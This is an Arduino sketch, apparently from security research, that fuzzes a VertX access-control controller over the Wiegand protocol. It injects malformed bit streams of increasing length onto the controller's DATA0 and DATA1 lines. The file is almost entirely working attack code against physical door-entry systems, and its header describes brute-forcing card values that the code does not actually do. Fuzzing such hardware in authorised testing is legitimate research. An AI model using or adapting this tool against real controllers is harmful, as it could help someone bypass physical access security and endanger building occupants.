/* Wiegand Fuzzer
*  Brad Antoniewicz
*  foundstone
*
* This is a prototype for a basic Wiegand protocol brute forcer
*
* The user provides a starting value via Serial, the Arduino
* is connected to DATA0 and DATA1, and attempts to brute force
* another value. 
* 
* Arduino Pinouts:
*        8 - Output to VertX Data 0 (Green)
*        9 - Output to VertX Data 1 (White)
*        GND - To VertX Ground (Black)
*
* 26-Bit Wiegand Format: 
* Bit 1 = Even Parity over Bits 2 - 13
* Bits 2 - 9 = Facility Code (0 to 255) Bit 2 is MSB
* Bits 10 - 25 = ID Number (0 to 65,535) Bit 10 is MSB
* Bits 26 Odd parity over bits 14 to 25
*
*
* Disclaimer - I know this code is REALLY sloppy and inefficient
*          Please don't judge me :)
*/

#define CARD_LEN 1024
unsigned long cardValue = 0;

int toVertX_D0 = 8; // output DATA0 (Green) to Controller
int toVertX_D1 = 9; // output DATA1 (White) to Controller

int incomingByte = 0; 
int sInputCount = 0;

void resetState() {
  Serial.println("[+] Reseting State...");
  delay(10);
  Serial.flush();
  sInputCount=0;
}

void sendD10(int numTimes) {
  Serial.println("[-] Sending bits simulatenously on DATA0 and DATA1");
  Serial.print("\tSending ");
  Serial.print(numTimes);
  Serial.println(" bits");
  
  for (short x=0; x<=numTimes; x++) {
    digitalWrite(toVertX_D0, LOW);
    digitalWrite(toVertX_D1, LOW);
    delayMicroseconds(34);
    digitalWrite(toVertX_D0, HIGH);
    digitalWrite(toVertX_D1, HIGH);
    delay(2);
    Serial.print(".");
    }
    Serial.println("");
}

void help() {
  Serial.println("Here are your options:");
  Serial.println("\t1 - Send bits simulatenously on DATA0 and DATA1");
  Serial.println("\t2 - Sending bits alternating between DATA0 and DATA1");
  Serial.println("Which number would you like to do?");
}

void sendLen(int length) {
  Serial.println("[-] Sending bits alternating between DATA0 and DATA1");
  Serial.print("\tSending a stream of ");
  Serial.print(length);
  Serial.println(" bits");
  
 for (short x=0; x<=length; x++) {
   if ( x % 2 == 1) {
     digitalWrite(toVertX_D0, LOW);
     delayMicroseconds(34);
     digitalWrite(toVertX_D0, HIGH);
   } else {
      digitalWrite(toVertX_D1, LOW);
      delayMicroseconds(34);
      digitalWrite(toVertX_D1, HIGH);
   }
   delay(2);
   Serial.print(".");   
 } 
 Serial.println("");
}

void setup()
{
  Serial.begin(38400);
   /* This stuff is for the Door Sensor LED */
  pinMode(13, OUTPUT); 
  pinMode(11, INPUT); // Reader 1
  pinMode(12, INPUT); // Reader 2
  // End Door Sensor Stuff
  
   delay(10);
  pinMode(toVertX_D0,OUTPUT);
  digitalWrite(toVertX_D0, HIGH);

  pinMode(toVertX_D1,OUTPUT);
  digitalWrite(toVertX_D1, HIGH);
  
  sInputCount = 0; 
 
  help();
 
}

void loop() {
  
  /* This stuff is for the Door Sensor LED */
  int reader1Status = digitalRead(11);
  int reader2Status = digitalRead(12);
  if ( reader1Status == HIGH || reader2Status == HIGH ) {
    digitalWrite(13, HIGH);
    delay(1000);
    digitalWrite(13, LOW);
   }else {
    digitalWrite(13, LOW); 
   }
  if (Serial.available() > 0 ) {
   incomingByte = Serial.read();
   switch(incomingByte) {
       case 49:
         Serial.println("Running Test 1");  
         for (short i=0; i<=CARD_LEN; i++) {
            sendD10(i);
            delay(1000);
          }
          help();
         break;
       case 50:
         Serial.println("Running Test 2");
        for (short i=0; i<=CARD_LEN; i++) {
          sendLen(i);
          delay(1000);
          }
          help();
         break;
       default: 
         Serial.println("Invalid Option!");
         help();
   }
    
  }
  // End Door Sensor Stuff



}
